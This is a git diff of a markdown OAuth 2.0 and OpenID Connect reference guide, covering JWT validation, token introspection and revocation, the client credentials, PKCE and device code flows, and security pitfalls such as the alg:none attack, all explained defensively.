@@ -1,6 +1,34 @@
 # OAuth 2.0 + OpenID Connect — Complete Reference Guide
 
-> **Scope of this document:** Pure protocol reference — OAuth 2.0, all grant types, OIDC, JWT, and production security patterns. Vendor-specific tooling (Apigee, PingFederate) is covered in separate documents.
+> **Scope:** Pure protocol reference — OAuth 2.0, all grant types, OIDC, JWT, production security patterns, and token lifecycle management. Vendor tooling (Apigee, PingFederate) is a separate track.
+
+---
+
+## 🗺️ Learning Roadmap
+
+```
+Phase 1 — Foundations          Phase 2 — Grant Types          Phase 3 — OIDC
+┌─────────────────────┐        ┌─────────────────────┐        ┌─────────────────────┐
+│ M1: Why OAuth exists│   →    │ M3: Client Creds    │   →    │ M6: OpenID Connect  │
+│ M2: JWT deep dive   │        │ M4: Auth Code + PKCE│        │     (identity layer)│
+└─────────────────────┘        │ M5: Other grants    │        └─────────────────────┘
+                                └─────────────────────┘
+                                          ↓
+                                Phase 4 — Production
+                                ┌─────────────────────┐
+                                │ M7: Security +      │
+                                │     Hardening       │
+                                └─────────────────────┘
+```
+
+| Symbol | Meaning |
+|:---:|---|
+| 💡 | Core concept |
+| 🔐 | Security critical |
+| 🏭 | Production pattern |
+| ⚠️ | Common mistake |
+| ✅ | Checklist item |
+| 📖 | Real-world example |
 
 ---
 
@@ -13,441 +41,436 @@
 5. [Module 5 — Other grant types](#module-5)
 6. [Module 6 — OpenID Connect (OIDC)](#module-6)
 7. [Module 7 — Production patterns and security hardening](#module-7)
-8. [Quick Reference — Cheat Sheet](#quick-reference)
+8. [Quick Reference Cheat Sheet](#quick-reference)
 
 ---
 
 ## Module 1 — The problem OAuth 2.0 solves {#module-1}
 
-### The credential-sharing problem
+### 💡 The credential-sharing problem
 
-Before OAuth, granting a third-party app access to your data required giving it your username and password. The app stored your credentials, had unrestricted permanent access, and you could only revoke that access by changing your password everywhere.
+Before OAuth, granting an app access to your data meant handing it your password. That app stored your credentials permanently, had unrestricted access to everything, and you had no way to revoke just *that* app's access without changing your password everywhere.
 
-**Real-world example:** Early Twitter apps asked for your Twitter password to post on your behalf. If one of those apps was breached, attackers had your password — not just access to Twitter.
-
-### What OAuth 2.0 is (and is not)
-
-- **OAuth 2.0 is an authorisation framework.** It answers: "what is this application allowed to do?"
-- **OAuth 2.0 is NOT an authentication protocol.** It does not tell you who the user is. That is what OpenID Connect adds.
-- It standardises *delegated access* — an app acts on a user's behalf with limited, time-bound, revocable permissions.
-
-### The four actors
+> **📖 Real-world example:** Early Twitter apps (2008–2010) asked for your Twitter username and password to post on your behalf. If one of those apps was breached, attackers had your password — not just access to Twitter. OAuth was specifically designed to eliminate this pattern.
 
 ```
-┌─────────────────┐     owns data      ┌─────────────────┐
-│ Resource Owner  │ ──────────────────▶ │ Resource Server │
-│  (the user)     │                     │   (the API)     │
-└────────┬────────┘                     └────────▲────────┘
-         │ grants consent                         │ validates token
-         ▼                                        │
-┌─────────────────┐   requests token   ┌──────────┴──────┐
-│    Client       │ ──────────────────▶ │  Auth Server    │
-│  (the app)      │ ◀──────────────────  │  (issues token) │
-└─────────────────┘   receives token   └─────────────────┘
+Before OAuth                          After OAuth
+──────────────────────────────────    ──────────────────────────────────
+App stores your password         →    App never sees your password
+Full, unrestricted access        →    Scoped, limited access only
+Access permanent until pw change →    Revoke any app anytime
+One breach = password exposed    →    Breach = short-lived token only
 ```
 
-| Actor | Role | Real-world example |
+### 💡 The four actors in every OAuth transaction
+
+```mermaid
+graph TD
+    RO["👤 Resource Owner\n(the user)"]
+    C["📱 Client\n(the application)"]
+    AS["🔐 Authorization Server\n(PingFed / Okta / Auth0)"]
+    RS["🌐 Resource Server\n(your API)"]
+
+    RO -- "1 · grants consent" --> C
+    C  -- "2 · requests token" --> AS
+    AS -- "3 · issues token" --> C
+    C  -- "4 · API call + token" --> RS
+    RS -- "5 · validates + responds" --> C
+```
+
+| Actor | Role | Real-world examples |
 |---|---|---|
-| Resource Owner | The user who owns the data and grants consent | You, the end user |
-| Client | The application requesting access | A web app, mobile app, or microservice |
-| Authorization Server | Issues tokens after verifying identity and consent | PingFederate, Okta, Auth0, Google |
-| Resource Server | The API that holds protected data and accepts tokens | Your backend API |
+| **Resource Owner** | The user who owns the data and grants consent | End user, employee |
+| **Client** | The application requesting access | Web app, mobile app, microservice |
+| **Authorization Server** | Issues tokens after verifying identity and consent | PingFederate, Okta, Auth0, Google |
+| **Resource Server** | The API that holds protected data, accepts tokens | Your backend API |
 
-### The token mental model
+### 💡 OAuth is authorisation, NOT authentication
 
-**Access token** — a signed permission slip. Short-lived (minutes to 1 hour). Sent with every API request. Like a hotel key card: limited access, expires automatically.
+> **⚠️ The single most important distinction in this entire guide:**
+> - **OAuth 2.0** answers: *"What is this application allowed to do?"*
+> - **OAuth 2.0 does NOT** tell you who the user is
+> - **OpenID Connect** (Module 6) adds identity on top of OAuth
 
-**Refresh token** — a long-lived credential used only to get new access tokens. Sent only to the Auth Server. Like the contract that lets you re-issue a key card. Must be stored very securely.
+### 💡 The token mental model
 
 ```
-Before OAuth:                     After OAuth:
-─────────────                     ────────────
-App stores your password          App never sees your password
-Full access forever               Scoped access only
-Can't revoke one app              Revoke per-app anytime
-Breach = attacker has password    Breach = attacker has short-lived token
+Access Token                         Refresh Token
+──────────────────────────────────   ──────────────────────────────────
+Short-lived (5 min – 1 hour)         Long-lived (days to months)
+Sent with every API request          Sent ONLY to the Auth Server
+Proves authorisation to the API      Used to silently get new access tokens
+If leaked: expires soon anyway       If leaked: must be revoked immediately
+Like: a hotel key card               Like: the contract to re-issue a key card
 ```
 
 ---
 
 ## Module 2 — JWT anatomy, signing, and validation {#module-2}
 
-### What is a JWT?
+### 💡 What is a JWT?
 
-A JSON Web Token (JWT) is the most common format for OAuth access tokens. It is **self-contained** — the Resource Server can validate it without calling the Auth Server on every request, because it carries a cryptographic signature.
+A JSON Web Token (JWT) is self-contained — the API can validate it without calling the Auth Server on every request, because the token carries a cryptographic signature. The server fetches the Auth Server's public key once, caches it, and validates all tokens locally.
 
-> **Important:** JWTs are Base64url-encoded, not encrypted. Anyone can decode and read the payload. Never put secrets, passwords, or sensitive PII in a JWT payload.
+> **🔐 Critical:** JWTs are Base64url-encoded — **not encrypted**. Anyone who intercepts a JWT can decode and read the payload. The signature only proves it wasn't tampered with. **Never put secrets, passwords, or sensitive PII in a JWT payload.**
 
-### Structure
+### 💡 JWT structure — three segments joined by dots
 
 ```
-eyJhbGciOiJSUzI1NiIsImtpZCI6ImtleS0xIn0    ← Header (Base64url)
-.
-eyJpc3MiOiJodHRwczovL2F1dGguZXhhbXBsZS5jb20iLCJzdWIiOiJ1c2VyXzEyMyJ9   ← Payload (Base64url)
-.
-SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c   ← Signature
+┌─────────────────────────────────────────────────────────────────────┐
+│                                                                     │
+│   eyJhbGciOiJSUzI1NiIsImtpZCI6ImtleS0xIn0                         │
+│   ────────────────────────────────────────                         │
+│   HEADER (Base64url) — algorithm + key ID                          │
+│                                                                     │
+│   .eyJpc3MiOiJodHRwczovL2F1dGguZXhhbXBsZS5jb20iLCJzdWIiOiJ1...    │
+│   ──────────────────────────────────────────────────────────────   │
+│   PAYLOAD (Base64url) — the claims                                 │
+│                                                                     │
+│   .SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c                    │
+│   ─────────────────────────────────────────────                    │
+│   SIGNATURE — cryptographic proof of integrity                     │
+│                                                                     │
+└─────────────────────────────────────────────────────────────────────┘
 ```
 
-### Header (decoded)
+### 💡 Header (decoded)
 
 ```json
 {
-  "alg": "RS256",
-  "kid": "key-1",
-  "typ": "JWT"
+  "alg": "RS256",    ← signing algorithm (tells receiver which crypto operation to use)
+  "kid": "key-1",   ← key ID (which public key in JWKS to use for verification)
+  "typ": "JWT"       ← token type
 }
 ```
 
-| Field | Meaning |
-|---|---|
-| `alg` | Signing algorithm. The receiver must validate this matches an allowed algorithm. |
-| `kid` | Key ID. Used to look up the correct public key from the JWKS endpoint. |
-| `typ` | Token type. Always `JWT`. |
-
-### Payload — standard claims
+### 💡 Payload — standard claims explained
 
 ```json
 {
-  "iss": "https://auth.example.com",
-  "sub": "user_123",
-  "aud": "https://api.example.com",
-  "exp": 1713456789,
-  "iat": 1713453189,
-  "jti": "a8f3c2d1-4b5e-6f7a-8b9c-0d1e2f3a4b5c",
-  "scope": "api.read profile",
-  "email": "john@example.com",
-  "roles": ["admin", "user"]
+  "iss": "https://auth.example.com",    ← Issuer: who created this token
+  "sub": "user_123",                    ← Subject: who the token is about
+  "aud": "https://api.example.com",     ← Audience: who the token is FOR
+  "exp": 1713456789,                    ← Expiry: Unix timestamp — MUST validate
+  "iat": 1713453189,                    ← Issued At: when it was created
+  "jti": "a8f3c2d1-...",               ← JWT ID: unique ID (replay prevention)
+  "scope": "api.read profile",          ← Scope: what permissions this grants
+  "email": "john@example.com",          ← Custom claim (added by Auth Server)
+  "roles": ["admin", "user"]            ← Custom claim (added by Auth Server)
 }
 ```
 
-| Claim | Name | Who validates it | Purpose |
-|---|---|---|---|
-| `iss` | Issuer | Resource Server | Must match the expected Auth Server URL. Prevents dev tokens being used in prod. |
-| `sub` | Subject | Application | Stable unique ID for the user or service. Use this as the database key, not email. |
-| `aud` | Audience | Resource Server | Must match the API's identifier. Prevents tokens issued for one API being used on another. |
-| `exp` | Expiry | Resource Server | Unix timestamp. Token must be rejected after this time. |
-| `iat` | Issued At | Optional | When the token was created. |
-| `jti` | JWT ID | Optional | Unique token ID. Store used JTIs to prevent replay attacks. |
-| `scope` | Scope | Resource Server | Space-separated permissions. Check the required scope is present. |
-
-### Signing algorithms
-
-| Algorithm | Type | Use | Notes |
-|---|---|---|---|
-| `RS256` | Asymmetric (RSA) | ✅ Recommended | Auth Server signs with private key; anyone verifies with public key via JWKS. |
-| `ES256` | Asymmetric (ECDSA) | ✅ Preferred | Same model as RS256 but smaller keys and faster. Increasingly standard. |
-| `HS256` | Symmetric (HMAC) | ⚠️ Avoid for APIs | Same secret signs and verifies — if the API has the secret, it can forge tokens. Only for internal systems where both sides are fully trusted. |
-
-### RS256 validation flow
-
-```
-Auth Server                JWKS Endpoint              Resource Server
-──────────────            ────────────────           ─────────────────
-Signs JWT with      →      Public key published  ←    Fetches public key
-private key                at /pf/JWKS                (once, caches it)
-                                                       Verifies signature
-                                                       Checks exp, iss, aud
-```
-
-### Critical security rule
-
-Always **explicitly set allowed algorithms** on the receiving side. The `alg:none` attack works by setting `"alg":"none"` in the header, which tricks naive libraries into skipping signature verification entirely.
-
-```javascript
-// WRONG — allows alg:none attack
-jwt.verify(token, publicKey);
-
-// CORRECT — restrict allowed algorithms
-jwt.verify(token, publicKey, { algorithms: ['RS256', 'ES256'] });
-```
-
-### JWT vs opaque tokens
-
-| | JWT | Opaque |
+| Claim | Who validates it | What happens if you skip it |
 |---|---|---|
-| Validation | Local (no network call) | Requires introspection call to Auth Server |
-| Revocation | Cannot revoke before expiry | Revocable instantly |
-| Contents | Visible claims in payload | Opaque reference — only Auth Server knows what it means |
-| Performance | Fast (local validation) | Adds latency per request |
-| Use when | High-traffic APIs, distributed systems | Strict revocation required, financial transactions |
+| `iss` | Resource Server | Tokens from dev accepted in prod (iss confusion attack) |
+| `sub` | Application | Wrong user identity used |
+| `aud` | Resource Server | Token for API-A accepted at API-B |
+| `exp` | Resource Server | Expired tokens accepted forever |
+| `scope` | Resource Server | Insufficient permissions not caught |
 
-**The logout problem with JWTs:** Because JWTs cannot be revoked, a user who "logs out" still has a valid token until it expires. Solutions: very short expiry (5-15 min), token blocklist (Redis), or opaque tokens for security-sensitive operations.
+### 💡 Signing algorithms
+
+| Algorithm | Type | Use | Verdict |
+|---|---|---|---|
+| **RS256** | Asymmetric (RSA) | Auth Server → API | ✅ Recommended |
+| **ES256** | Asymmetric (ECDSA) | Auth Server → API | ✅ Preferred (smaller keys) |
+| **HS256** | Symmetric (HMAC) | Internal systems only | ⚠️ Avoid for APIs |
+| **none** | No signature | — | 🔐 **Never allow — catastrophic** |
+
+> **🔐 The `alg:none` attack:** Setting `"alg":"none"` in the JWT header tricks naive libraries into skipping signature verification entirely. A signed token is rewritten with `alg:none`, signature removed — and the library accepts it as valid. **Always explicitly set your allowed algorithm list.**
+
+### 💡 RS256 validation flow
+
+```mermaid
+sequenceDiagram
+    participant AS as 🔐 Auth Server
+    participant JWKS as 🔑 JWKS Endpoint
+    participant C as 📱 Client
+    participant RS as 🌐 Resource Server
+
+    AS->>C: Issues JWT (signed with private key)
+    AS->>JWKS: Publishes public key at /pf/JWKS
+    C->>RS: API request with Bearer JWT
+    RS->>JWKS: GET /.well-known/jwks.json (once, then cached)
+    JWKS->>RS: Public keys
+    Note over RS: Validate locally:<br/>signature ✓ exp ✓ iss ✓ aud ✓
+    RS->>C: 200 OK (or 401 if invalid)
+```
+
+### 💡 JWT vs opaque tokens
+
+| | JWT | Opaque token |
+|---|---|---|
+| Validation | Local (no network call, ~0ms) | Introspection call to Auth Server (+50–100ms) |
+| Revocation | ❌ Cannot revoke before expiry | ✅ Revocable instantly |
+| Visibility | Payload readable by anyone | Opaque — only Auth Server knows contents |
+| Best for | High-traffic APIs, distributed systems | Strict revocation, financial transactions |
+
+> **🏭 The logout problem with JWTs:** A user who "logs out" still has a valid JWT until it expires. Solutions: short expiry (5–15 min) + refresh tokens, a token blocklist in Redis, or the Token Revocation endpoint (below).
+
+### 💡 Token Introspection endpoint (RFC 7662)
+
+When using **opaque tokens** (or when you need real-time revocation checking), call the Auth Server's introspection endpoint to validate a token on every request.
+
+```
+Request:
+  POST https://auth.example.com/introspect
+  Authorization: Basic base64(client_id:client_secret)
+  Content-Type: application/x-www-form-urlencoded
+  Body: token=<opaque_or_jwt_token>
+
+Response (active token):
+  {
+    "active": true,
+    "sub": "user_123",
+    "client_id": "my-app",
+    "scope": "api.read",
+    "exp": 1713456789,
+    "iss": "https://auth.example.com"
+  }
+
+Response (invalid / expired / revoked token):
+  { "active": false }
+```
+
+> **🏭 When to use introspection vs JWKS validation:**
+> - High-traffic API → JWKS (local validation, ~0ms overhead)
+> - Requires instant revocation (financial, healthcare) → Introspection
+> - Opaque tokens → Must use introspection (JWT validation not possible)
+> - Some banks use both: JWKS for standard calls, introspection for high-value transactions
+
+### 💡 Token Revocation endpoint (RFC 7009)
+
+Explicitly invalidate a token — access token on logout, refresh token on compromise.
+
+```bash
+# Revoking a refresh token on user logout
+POST https://auth.example.com/oauth/revoke
+Authorization: Basic base64(client_id:client_secret)
+Content-Type: application/x-www-form-urlencoded
+
+token=<refresh_token>&token_type_hint=refresh_token
+
+# Response: 200 OK (even if token was already invalid — prevents enumeration)
+```
+
+> **🔐 Revoke the refresh token first.** If an attacker has both the access token and refresh token, revoking the refresh token prevents them from getting new access tokens once the current one expires. The access token will expire naturally within its short window.
 
 ---
 
 ## Module 3 — Client Credentials grant {#module-3}
 
-### When to use it
+### 💡 When to use it
 
-The application itself is the Resource Owner. There is no user. The app authenticates using its own registered identity (client_id + client_secret).
-
-**Use for:**
-- Microservice-to-microservice calls
-- Scheduled cron jobs and batch processes
-- CI/CD pipelines calling deployment or registry APIs
-- Backend data sync and ETL processes
-- IoT device telemetry uploads
-
-**Do NOT use when:**
-- A real human user is involved
-- You need per-user data access
-- The action is being performed on behalf of a specific user
-
-### Complete flow
+The application **is** the Resource Owner. There is no user. The app authenticates using its own registered identity.
 
 ```
-1. App → Auth Server
-   POST /token
-   Authorization: Basic base64(client_id:client_secret)
-   Body: grant_type=client_credentials&scope=api.read
-
-2. Auth Server validates credentials and scope registration
-
-3. Auth Server → App
-   200 OK
-   {
-     "access_token": "eyJhbGci...",
-     "token_type": "Bearer",
-     "expires_in": 3600,
-     "scope": "api.read"
-   }
-   NOTE: No refresh_token is issued for Client Credentials
-
-4. App caches token in memory, reuses until ~5 min before expiry
-
-5. App → Resource Server
-   GET /api/resource
-   Authorization: Bearer eyJhbGci...
-
-6. Resource Server validates JWT locally via JWKS → 200 OK
+✅ Use for:                         ❌ Never use for:
+────────────────────────────────    ────────────────────────────────
+Microservice-to-microservice        When a real user is involved
+Scheduled cron jobs                 Per-user data access
+CI/CD pipeline → deployment API     Actions on behalf of a user
+Background data sync                Anything requiring refresh token
+IoT device telemetry upload         (refresh tokens are not issued)
 ```
 
-### Token payload for Client Credentials
+### 💡 Complete flow
+
+```mermaid
+sequenceDiagram
+    participant App as ⚙️ Service App
+    participant AS as 🔐 Auth Server
+    participant API as 🌐 Resource Server
+
+    App->>AS: POST /token<br/>grant_type=client_credentials<br/>Authorization: Basic base64(id:secret)<br/>scope=api.read
+    AS->>AS: Validate credentials + scope
+    AS->>App: 200 OK<br/>{ access_token, expires_in }<br/>❌ No refresh_token issued
+    Note over App: Cache token in memory<br/>Reuse until 5min before expiry
+    App->>API: GET /resource<br/>Authorization: Bearer <token>
+    API->>API: Validate JWT via JWKS
+    API->>App: 200 OK + data
+```
+
+### 💡 Token payload (Client Credentials)
 
 ```json
 {
   "iss": "https://auth.example.com",
-  "sub": "order-service",          ← The service, not a user
+  "sub": "order-service",          ← The SERVICE is the subject, not a user
   "aud": "https://payment-api.example.com",
   "scope": "payment.initiate payment.read",
   "exp": 1713456789,
-  "client_id": "order-service"     ← Same as sub for CC tokens
+  "client_id": "order-service"
 }
 ```
 
-### Real-world: payment microservices platform
+### 📖 Real-world: payment microservices platform
 
 ```
-Order Service ──(token: order-svc)──▶ Auth Server ──▶ issues token
-     │                                                         │
-     │ Bearer token (scope: payment.initiate)                  │
-     ▼                                                         │
-Payment Service ◀── validates JWT locally ◀──────────────────┘
-     │
-     │ Bearer token (scope: fraud.check) — separate token request
-     ▼
-Fraud Service
+  Order Service ──────────────────────────────────┐
+  (client: order-svc)                             │ POST /token
+                                                  ▼
+                                         🔐 Auth Server
+                                                  │ access_token
+                                                  │ scope: payment.initiate
+  ┌───────────────────────────────────────────────┘
+  │
+  ▼
+  Payment Service   ←── Bearer token ───   Order Service
+  Checks: iss ✓  aud ✓  scope ✓
+  │
+  └── Calls Fraud Service with separate token (scope: fraud.check)
 ```
 
-Each service has its own `client_id`. When Order Service calls Payment Service, it uses its service-scoped token. Payment Service checks: `iss` ✓ `aud` ✓ `scope contains "payment.initiate"` ✓.
-
-### Token caching pattern (Node.js)
+### 🏭 Token caching — the critical production pattern
 
 ```javascript
 let cachedToken = null;
-let tokenExpiry = 0;
+let tokenExpiry  = 0;
 
 async function getAccessToken() {
-  const now = Math.floor(Date.now() / 1000);
+  const now           = Math.floor(Date.now() / 1000);
   const bufferSeconds = 300; // refresh 5 min before expiry
 
+  // ✅ Reuse if still valid
   if (cachedToken && now < tokenExpiry - bufferSeconds) {
-    return cachedToken; // reuse cached token
+    return cachedToken;
   }
 
-  const response = await fetch('https://auth.example.com/token', {
-    method: 'POST',
+  // 🔄 Request a new token
+  const res = await fetch("https://auth.example.com/token", {
+    method: "POST",
     headers: {
-      'Authorization': 'Basic ' + Buffer.from(`${CLIENT_ID}:${CLIENT_SECRET}`).toString('base64'),
-      'Content-Type': 'application/x-www-form-urlencoded'
+      "Authorization": "Basic " + Buffer.from(`${CLIENT_ID}:${CLIENT_SECRET}`).toString("base64"),
+      "Content-Type": "application/x-www-form-urlencoded",
     },
     body: new URLSearchParams({
-      grant_type: 'client_credentials',
-      scope: 'api.read'
-    })
+      grant_type: "client_credentials",
+      scope: "api.read",
+    }),
   });
 
-  const data = await response.json();
-  cachedToken = data.access_token;
-  tokenExpiry = now + data.expires_in;
+  const data     = await res.json();
+  cachedToken    = data.access_token;
+  tokenExpiry    = now + data.expires_in;
   return cachedToken;
 }
 ```
 
-### Client secret management
+### 🔐 Client secret management
 
-| Environment | How to store the secret |
+| Environment | Storage method |
 |---|---|
-| Development | Environment variables (`.env` file, never committed) |
-| Production | HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, GCP Secret Manager |
-| **Never** | Source code, config files in git, hardcoded strings, log files |
+| Development | `.env` file (never committed to git) |
+| Production | HashiCorp Vault, AWS Secrets Manager, Azure Key Vault |
+| **Never** | Source code, config files in git, log files, hardcoded strings |
 
-**Zero-downtime secret rotation:**
-1. Register a second client secret in the Auth Server
-2. Deploy the new secret to all instances
-3. Remove the old secret from the Auth Server once all instances are using the new one
-
-**Alternative to client_secret for high-security environments:** mTLS client authentication — the client presents a certificate instead of a secret. The Auth Server verifies the certificate. No shared secret to leak.
+> **🏭 Zero-downtime secret rotation:** (1) register second secret on Auth Server → (2) deploy new secret to all instances → (3) verify all instances using new secret → (4) remove old secret from Auth Server.
 
 ---
 
 ## Module 4 — Authorization Code grant + PKCE {#module-4}
 
-### The core insight: front-channel vs back-channel
+### 💡 The core insight: front-channel vs back-channel
 
-The browser (front channel) is untrusted. Anything in a URL is visible in browser history, referrer headers, and server logs. So we never send the access token through the browser.
-
-Instead:
-1. **Front channel (URL redirect):** carries only the `auth_code` — short-lived (60s), single-use, useless without the client secret or PKCE verifier
-2. **Back channel (server-to-server HTTPS):** carries the actual tokens — never touches the browser
-
-### Complete flow with PKCE
+The browser (front channel) is untrusted — anything in a URL appears in browser history, referrer headers, and server logs. So we **never** put the access token in a URL redirect.
 
 ```
-Step 1: App generates PKCE pair
-  code_verifier  = random 64-byte value (e.g. "dBjftJeZ4CVP-...")
-  code_challenge = BASE64URL(SHA256(code_verifier))
-
-Step 2: App redirects browser to Auth Server (front channel)
-  GET /authorize
-    ?response_type=code
-    &client_id=my-app
-    &redirect_uri=https://app.example.com/callback
-    &scope=openid+profile+api.read
-    &state=random_csrf_token         ← CSRF prevention
-    &code_challenge=BASE64URL(SHA256(verifier))
-    &code_challenge_method=S256
-
-Step 3: Auth Server shows login page, user authenticates and consents
-
-Step 4: Auth Server redirects back with auth code (front channel)
-  GET https://app.example.com/callback
-    ?code=SplxlOBeZQQYbYS6WxSbIA
-    &state=random_csrf_token         ← App verifies this matches
-
-Step 5: App exchanges code for tokens (back channel — server-to-server)
-  POST /token
-  Authorization: Basic base64(client_id:client_secret)
-  Body:
-    grant_type=authorization_code
-    code=SplxlOBeZQQYbYS6WxSbIA
-    redirect_uri=https://app.example.com/callback
-    code_verifier=dBjftJeZ4CVP-...   ← PKCE proof
-
-Step 6: Auth Server verifies SHA256(code_verifier) == code_challenge
-
-Step 7: Auth Server returns tokens
-  {
-    "access_token":  "eyJhbGci...",  ← Send to APIs
-    "id_token":      "eyJhbGci...",  ← Use in your app only, NEVER send to API
-    "refresh_token": "8xLOxBtZ...",  ← Store securely, send only to Auth Server
-    "expires_in":    3600
-  }
-
-Step 8: App calls API with access_token only
-  GET /api/resource
-  Authorization: Bearer <access_token>
+Front channel (browser URL):           Back channel (server-to-server):
+──────────────────────────────────     ──────────────────────────────────
+auth_code (short-lived, 60s)           access_token
+state (CSRF token)                     refresh_token
+                                        id_token
+Exposed — but auth code alone is        Never touches the browser
+useless without the PKCE verifier
 ```
 
-### PKCE — the auth code interception attack
+### 💡 Complete flow with PKCE
+
+```mermaid
+sequenceDiagram
+    participant U as 👤 User
+    participant B as 🌐 Browser
+    participant App as 📱 Your App
+    participant AS as 🔐 Auth Server
+    participant API as ⚡ Resource Server
+
+    App->>App: Generate code_verifier (random 64 bytes)<br/>code_challenge = SHA256(verifier)
+    B->>AS: GET /authorize?response_type=code<br/>&code_challenge=S256_hash<br/>&state=random_csrf<br/>&scope=openid profile api.read
+    AS->>B: Show login + consent page
+    U->>AS: Enter credentials + MFA
+    AS->>B: 302 redirect: callback?code=AUTH_CODE&state=...
+    B->>App: code arrives at callback URL
+    App->>App: Verify state matches stored value ✓
+    App->>AS: POST /token (back-channel)<br/>code + code_verifier + client_secret
+    AS->>AS: SHA256(verifier) == challenge? ✓
+    AS->>App: access_token + id_token + refresh_token
+    App->>API: GET /api with Bearer access_token
+    API->>App: 200 OK + data
+```
+
+### 🔐 PKCE — the auth code interception attack
 
 ```
 Without PKCE:
-  1. Malicious app on same device registers the same redirect URI
-  2. It intercepts the auth_code from the redirect
-  3. It sends the code to the token endpoint with its own client_id
-  4. Auth Server cannot tell the code was stolen → issues token to attacker
+  1. Malicious app intercepts auth_code from redirect URI
+  2. Submits code to token endpoint with its own client_id
+  3. Auth Server cannot tell code was stolen → issues token to attacker
 
 With PKCE:
-  1. Legitimate app generates code_verifier and sends SHA256(verifier) as challenge
-  2. Malicious app intercepts the code
-  3. It cannot produce the code_verifier (never transmitted over front channel)
-  4. Auth Server rejects the exchange → attack fails
+  1. Legitimate app generates code_verifier (never sent over front-channel)
+  2. Sends SHA256(verifier) as code_challenge in the authorization request
+  3. Attacker intercepts auth_code but has no verifier
+  4. Auth Server: SHA256(attacker_guess) ≠ challenge → rejects exchange
 ```
 
-### PKCE implementation (browser)
+### 💡 PKCE implementation (browser JavaScript)
 
 ```javascript
-// Generate PKCE verifier and challenge
 async function generatePKCE() {
-  const array = new Uint8Array(64);
+  // Generate 64 random bytes → URL-safe Base64
+  const array    = new Uint8Array(64);
   crypto.getRandomValues(array);
   const verifier = btoa(String.fromCharCode(...array))
-    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
+    .replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "");
 
-  const encoder = new TextEncoder();
-  const digest = await crypto.subtle.digest('SHA-256', encoder.encode(verifier));
+  // SHA-256 hash of the verifier → the challenge sent to Auth Server
+  const digest    = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(verifier));
   const challenge = btoa(String.fromCharCode(...new Uint8Array(digest)))
-    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
+    .replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "");
 
   return { verifier, challenge };
 }
 
-// Before redirect
+// --- Before redirect ---
 const { verifier, challenge } = await generatePKCE();
 const state = crypto.randomUUID();
 
-// Store in sessionStorage (cleared on tab close)
-sessionStorage.setItem('pkce_verifier', verifier);
-sessionStorage.setItem('oauth_state', state);
+sessionStorage.setItem("pkce_verifier", verifier);  // Store verifier
+sessionStorage.setItem("oauth_state", state);        // Store state for CSRF check
 
-// Build authorization URL
-const authUrl = new URL('https://auth.example.com/authorize');
-authUrl.searchParams.set('response_type', 'code');
-authUrl.searchParams.set('client_id', 'my-app');
-authUrl.searchParams.set('redirect_uri', 'https://app.example.com/callback');
-authUrl.searchParams.set('scope', 'openid profile api.read');
-authUrl.searchParams.set('state', state);
-authUrl.searchParams.set('code_challenge', challenge);
-authUrl.searchParams.set('code_challenge_method', 'S256');
-window.location.href = authUrl.toString();
+// --- In callback handler ---
+const params = new URLSearchParams(window.location.search);
 
-// In callback handler
-function handleCallback() {
-  const params = new URLSearchParams(window.location.search);
-
-  // Verify state to prevent CSRF
-  if (params.get('state') !== sessionStorage.getItem('oauth_state')) {
-    throw new Error('State mismatch — possible CSRF attack');
-  }
-
-  const code = params.get('code');
-  const verifier = sessionStorage.getItem('pkce_verifier');
-
-  // Clean up
-  sessionStorage.removeItem('pkce_verifier');
-  sessionStorage.removeItem('oauth_state');
-
-  return exchangeCodeForTokens(code, verifier);
+if (params.get("state") !== sessionStorage.getItem("oauth_state")) {
+  throw new Error("State mismatch — possible CSRF attack");  // 🔐 CSRF check
 }
 ```
 
-### The state parameter and nonce
+### 🔐 The `state` parameter and `nonce`
 
 | Parameter | Protects against | How to use |
 |---|---|---|
-| `state` | Login CSRF — attacker tricks browser into completing attacker's login | Generate random UUID before redirect, store in sessionStorage, verify on callback |
-| `nonce` | ID token replay attacks in OIDC | Generate random value, include in auth request, verify it appears in the returned ID token |
+| `state` | Login CSRF — attacker tricks browser into completing attacker's flow | Generate random UUID, store in sessionStorage, verify on callback |
+| `nonce` | ID token replay attacks (OIDC) | Generate random value, include in auth request, verify it appears in returned ID token |
 
-### Real-world: enterprise HR portal
+### 📖 Real-world: enterprise HR portal
 
 ```json
-// Access token payload for employee accessing HR portal
 {
   "iss": "https://identity.company.com",
   "sub": "employee_78234",
   "aud": "https://hr-api.company.com",
-  "exp": 1713456789,
   "scope": "openid profile hr.read hr.self",
   "email": "jane.smith@company.com",
   "roles": ["employee", "manager"],
@@ -455,548 +478,350 @@ function handleCallback() {
   "employee_id": "EMP78234"
 }
 ```
-
-The HR API enforces:
-- `hr.read` scope → can view team data
-- `hr.self` scope → can view own data
-- `"manager"` role → can approve leave requests for their team
+The HR API enforces: `hr.self` scope → own data only | `manager` role → approve team leave requests
 
 ---
 
 ## Module 5 — Other grant types {#module-5}
 
-### Device Code grant (RFC 8628)
+### 💡 Device Code grant (RFC 8628)
 
-For devices with no browser or limited input: smart TVs, CLI tools, IoT sensors, gaming consoles.
+For devices with **no browser or limited input**: smart TVs, CLI tools, IoT sensors.
 
-```
-Step 1: Device → Auth Server
-  POST /device_authorization
-  Body: client_id=my-tv-app&scope=openid profile
+```mermaid
+sequenceDiagram
+    participant D as 📺 Device (Smart TV)
+    participant AS as 🔐 Auth Server
+    participant U as 📱 User (on phone)
 
-Step 2: Auth Server → Device
-  {
-    "device_code":      "GmRhmhcxhwAzkoEqiMEg_DnyEysNkuNhszIySk9eS",
-    "user_code":        "BDPF-YTVQ",
-    "verification_uri": "https://auth.example.com/device",
-    "expires_in":       1800,
-    "interval":         5
-  }
-
-Step 3: TV displays to user
-  "Visit: auth.example.com/device
-   Enter code: BDPF-YTVQ"
-
-Step 4: User visits URL on phone/laptop, enters code, authenticates and approves
-
-Step 5: Device polls every 5 seconds
-  POST /token
-  Body: grant_type=urn:ietf:params:oauth:grant-type:device_code
-        &device_code=GmRhmhcxhwAzkoEqiMEg_DnyEysNkuNhszIySk9eS
-        &client_id=my-tv-app
-
-  → Receives "authorization_pending" until user approves
-  → Once approved: 200 OK with access_token
-
